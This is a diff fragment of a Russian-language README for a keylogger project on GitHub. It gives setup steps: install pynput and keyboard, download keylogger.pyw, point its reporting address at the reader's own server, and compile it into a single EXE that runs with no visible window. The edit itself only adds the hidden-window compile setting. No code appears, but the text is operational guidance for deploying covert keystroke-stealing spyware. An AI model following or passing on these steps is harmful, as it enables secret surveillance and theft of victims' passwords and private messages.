@@ -28,7 +28,7 @@ pip install pynput keyboard
 
 2. Скачайте [keylogger.pyw](https://github.com/ArtemChikc/POST-KeyLogger/blob/main/keylogger.pyw) и в строке №177 замените "http://127.0.0.1:5000" на IP или домен вашего сервера.
 
-3. Скомпилируйте в EXE файл [keylogger.pyw](https://github.com/ArtemChikc/POST-KeyLogger/blob/main/keylogger.pyw) (рекомендуется через auto-py-to-exe, так проще):
+3. Скомпилируйте в EXE файл [keylogger.pyw](https://github.com/ArtemChikc/POST-KeyLogger/blob/main/keylogger.pyw) с такими аттрибутами:
 ```
 ONE FILE | NO WINDOW
 ```
